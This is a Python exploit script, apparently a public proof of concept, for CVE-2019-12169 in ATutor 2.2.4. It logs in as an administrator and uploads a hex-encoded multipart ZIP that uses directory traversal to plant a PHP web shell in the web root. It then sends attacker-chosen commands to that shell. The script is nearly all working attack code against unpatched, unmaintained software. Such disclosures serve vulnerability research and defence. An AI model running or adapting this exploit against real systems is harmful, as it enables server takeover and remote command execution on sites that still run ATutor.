#!/usr/bin/env python
#
# Exploit Title: ATutor 2.2.4 'language_import' Arbitrary File Upload / RCE [CVE-2019-12169]
# Date: 5/24/19
# Exploit Author: liquidsky (JMcPeters)
# Vendor Homepage: https://atutor.github.io/
# Software Link: https://sourceforge.net/projects/atutor/files/latest/download
# Version: 2.2.4
# Tested on: Windows 8 / Apache / MySQL (XAMPP)
# CVE : CVE-2019-12169
# Author Site: http://incidentsecurity.com/atutor-2-2-4-language_import-arbitrary-file-upload-rce/ | https://github.com/fuzzlove
#
# Description: ATutor 2.2.4 allows Arbitrary File Upload and Directory Traversal
# resulting in remote code execution via a ".." pathname in a ZIP archive to the mods/_core/languages/language_import.php (aka Import New Language) or mods/_standard/patcher/index_admin.php (aka Patcher) component.
#
# Greetz: wetw0rk, offsec ^^
#
# Notes: This application is no longer being maintained so there is no fix for this issue.

import sys, hashlib, requests
import urllib
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
import time


print "+-------------------------------------------------------------+"
print
print "- ATutor 2.2.4 Arbitrary File Upload / RCE [CVE-2019-12169]"
print
print "-          Discovery / PoC by liquidsky (JMcPeters) ^^"
print
print "+-------------------------------------------------------------+"

try:
#settings
	target   = sys.argv[1]
	username = sys.argv[2]
	password = sys.argv[3]
	commands = sys.argv[4]

except IndexError:

        print
	print "- usage: %s <target> <username> <password> <command>" % sys.argv[0]
	print "- Example: %s incidentsecurity.com admin mypassword 'whoami" % sys.argv[0]
        print
	sys.exit()


# headers to upload zip
headers = {
    "Accept-Encoding": "gzip, deflate",
    "Referer": "http://" + target + "/ATutor/mods/_core/languages/language_import.php",
    "Connection": "close",
    "Content-Type": "multipart/form-data; boundary=---------------------------CVE201912169",
}

# Note: This was successfully tested against a windows install however it should work with linux.
# -----
# This will drop a shell on c:\xampp\htdocs\liquidsky.php and or /var/www/html/liquidsky.php
# using directory traversal.


# php file payload
data = ""
data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d"
data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x43"
data += "\x56\x45\x32\x30\x31\x39\x31\x32\x31\x36\x39\x0d\x0a\x43\x6f"
data += "\x6e\x74\x65\x6e\x74\x2d\x44\x69\x73\x70\x6f\x73\x69\x74\x69"
data += "\x6f\x6e\x3a\x20\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61\x3b\x20"
data += "\x6e\x61\x6d\x65\x3d\x22\x66\x69\x6c\x65\x22\x3b\x20\x66\x69"
data += "\x6c\x65\x6e\x61\x6d\x65\x3d\x22\x70\x6f\x63\x2e\x7a\x69\x70"
data += "\x22\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65"
data += "\x3a\x20\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x7a"
data += "\x69\x70\x0d\x0a\x0d\x0a\x50\x4b\x03\x04\x14\x00\x00\x00\x08"
data += "\x00\xa4\x00\xb8\x4e\xbb\xb9\x35\x2d\x6a\x00\x00\x00\x6a\x00"
data += "\x00\x00\x2c\x00\x00\x00\x2e\x2e\x5c\x2e\x2e\x5c\x2e\x2e\x5c"
data += "\x2e\x2e\x5c\x2e\x2e\x5c\x2e\x2e\x2f\x78\x61\x6d\x70\x70\x5c"
data += "\x68\x74\x64\x6f\x63\x73\x5c\x6c\x69\x71\x75\x69\x64\x73\x6b"
data += "\x79\x2e\x70\x68\x70\xb3\xb1\x2f\xc8\x28\x50\x48\x2d\x4b\xcc"
data += "\xd1\x50\xb2\xb7\x53\xd2\x4b\x4a\x2c\x4e\x35\x33\x89\x4f\x49"
data += "\x4d\xce\x4f\x49\xd5\x50\x72\x09\xcc\xf7\x02\x62\x8b\x00\x63"
data += "\xa7\xfc\x64\x67\xa7\x9c\x48\xa3\x8c\x32\x4f\x0f\xa7\x8c\x64"
data += "\x63\x3f\x83\x44\x0f\x2f\x43\x6f\xe7\xa0\xb4\x20\x83\xb0\xd0"
data += "\xf0\xca\x94\xe2\xc8\x70\xd3\xbc\x94\x70\xb7\xbc\xa8\xe0\x94"
data += "\x14\xef\x90\xe2\xf4\x80\x2a\x13\x3f\xe7\x74\x5b\x5b\x25\x4d"
data += "\x4d\x6b\x05\x7b\x3b\x00\x50\x4b\x03\x04\x14\x00\x00\x00\x08"
data += "\x00\xa4\x00\xb8\x4e\xbb\xb9\x35\x2d\x6a\x00\x00\x00\x6a\x00"
data += "\x00\x00\x2c\x00\x00\x00\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f"
data += "\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x76\x61\x72\x2f\x77\x77"
data += "\x77\x2f\x68\x74\x6d\x6c\x2f\x6c\x69\x71\x75\x69\x64\x73\x6b"
data += "\x79\x2e\x70\x68\x70\xb3\xb1\x2f\xc8\x28\x50\x48\x2d\x4b\xcc"
data += "\xd1\x50\xb2\xb7\x53\xd2\x4b\x4a\x2c\x4e\x35\x33\x89\x4f\x49"
data += "\x4d\xce\x4f\x49\xd5\x50\x72\x09\xcc\xf7\x02\x62\x8b\x00\x63"
data += "\xa7\xfc\x64\x67\xa7\x9c\x48\xa3\x8c\x32\x4f\x0f\xa7\x8c\x64"
data += "\x63\x3f\x83\x44\x0f\x2f\x43\x6f\xe7\xa0\xb4\x20\x83\xb0\xd0"
data += "\xf0\xca\x94\xe2\xc8\x70\xd3\xbc\x94\x70\xb7\xbc\xa8\xe0\x94"
data += "\x14\xef\x90\xe2\xf4\x80\x2a\x13\x3f\xe7\x74\x5b\x5b\x25\x4d"
data += "\x4d\x6b\x05\x7b\x3b\x00\x50\x4b\x01\x02\x14\x03\x14\x00\x00"
data += "\x00\x08\x00\xa4\x00\xb8\x4e\xbb\xb9\x35\x2d\x6a\x00\x00\x00"
data += "\x6a\x00\x00\x00\x2c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
data += "\x00\x80\x01\x00\x00\x00\x00\x2e\x2e\x5c\x2e\x2e\x5c\x2e\x2e"
data += "\x5c\x2e\x2e\x5c\x2e\x2e\x5c\x2e\x2e\x2f\x78\x61\x6d\x70\x70"
data += "\x5c\x68\x74\x64\x6f\x63\x73\x5c\x6c\x69\x71\x75\x69\x64\x73"
data += "\x6b\x79\x2e\x70\x68\x70\x50\x4b\x01\x02\x14\x03\x14\x00\x00"
data += "\x00\x08\x00\xa4\x00\xb8\x4e\xbb\xb9\x35\x2d\x6a\x00\x00\x00"
data += "\x6a\x00\x00\x00\x2c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
data += "\x00\x80\x01\xb4\x00\x00\x00\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e"
data += "\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x76\x61\x72\x2f\x77"
data += "\x77\x77\x2f\x68\x74\x6d\x6c\x2f\x6c\x69\x71\x75\x69\x64\x73"
data += "\x6b\x79\x2e\x70\x68\x70\x50\x4b\x05\x06\x00\x00\x00\x00\x02"
data += "\x00\x02\x00\xb4\x00\x00\x00\x68\x01\x00\x00\x00\x00\x0d\x0a"
data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d"
data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x43"
data += "\x56\x45\x32\x30\x31\x39\x31\x32\x31\x36\x39\x0d\x0a\x43\x6f"
data += "\x6e\x74\x65\x6e\x74\x2d\x44\x69\x73\x70\x6f\x73\x69\x74\x69"
data += "\x6f\x6e\x3a\x20\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61\x3b\x20"
data += "\x6e\x61\x6d\x65\x3d\x22\x73\x75\x62\x6d\x69\x74\x22\x0d\x0a"
data += "\x0d\x0a\x49\x6d\x70\x6f\x72\x74\x0d\x0a\x2d\x2d\x2d\x2d\x2d"
data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d"
data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x43\x56\x45\x32\x30\x31"
data += "\x39\x31\x32\x31\x36\x39\x2d\x2d\x0d\x0a"


#reverse shell url
shell = "http://" + target + "/liquidsky.php?language=" + commands

# Generate Hash
def gen_hash(passwd, token):
        m= hashlib.sha1()
        m.update(passwd + token)
        return m.hexdigest()
 
def we_can_get_jiggy_with_the_pass():

# Run pass through SHA1
     hash_object = hashlib.sha1(password)
     hex_dig = hash_object.hexdigest()
     print "[*] Got SHA1 for pass: " + (hex_dig)

     targeturl = "http://" + target + "/ATutor/login.php"
     token = "abc"
     hashed = gen_hash(hex_dig, token)
     d = {
         "form_password_hidden" : hashed,
         "form_login": "admin",
         "submit": "Login",
         "token" : token
     }
     s = requests.Session()

#Logging in
     r = s.post(targeturl, data=d)
     print "[+] Logging in to system as %s ..." % (username)
     res = r.text

# url settings, duh
     url = "http://" + target + "/ATutor/mods/_core/languages/language_import.php"

# A similar method works for the "patcher" function.
    # url = "http://" + target + "/ATutor/mods/_standard/patcher/index_admin.php"

# This is "the" request to send the zip     
     request = s.post(url, headers=headers, data=data, verify=False)
     print "[+] Sent the zip ......"
     time.sleep(1)

# Grab shell dude!
     print "[!] *** Remote Code Execution ***"
     request = s.post(shell, verify=False)
     print "[x] http://" + target + "/liquidsky.php?language=" + commands

# Note be sure to clean up: c:\xampp\htdocs\liquidsky.php and or /var/www/html/liquidsky.php

     if "Administration" in res:
         return True
     return False 
 
def main():
     if we_can_get_jiggy_with_the_pass():
         print ""
         print "[+] Success! we were able to login!"
         print ""
         print "  ^_~  got r00t?   - [liquidsky 2019]"
     else:         print "[-] failure!" 
 
if __name__ == "__main__":
     main()
